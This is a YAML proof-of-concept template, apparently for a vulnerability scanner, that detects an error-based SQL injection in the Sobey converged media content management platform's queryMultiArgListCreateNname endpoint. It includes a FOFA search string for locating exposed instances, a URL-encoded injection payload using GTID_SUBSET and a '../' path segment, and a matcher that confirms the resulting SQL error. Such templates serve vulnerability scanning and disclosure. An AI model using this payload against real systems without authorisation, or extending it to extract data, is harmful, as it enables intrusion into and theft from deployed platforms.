id: poc-yaml-sobey-imcmp-querymultiarglistcreatenname-sqli
info:
  name: 索贝融合媒体内容管理平台 queryMultiArgListCreateNname SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 索贝融合媒体内容管理平台
  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /sobey-mchEditor/mch/statistics/js/../queryMultiArgListCreateNname?channelId=1+AND+GTID_SUBSET%28CONCAT%280x7e%2C%28SELECT+%28ELT%286628%3D6628%2Cmd5({{.t1}})%29%29%29%2C0x7e%29%2C6628%29&token=1&siteCode=1&parameter=auditor
  expression: status_code == 500 && contains(body,"Sobey") && contains(body,"queryMultiArgListCreateNname")
    && contains(body,`~` + t2 + `~`) && contains(body,"java.sql.SQLException")
transport: http
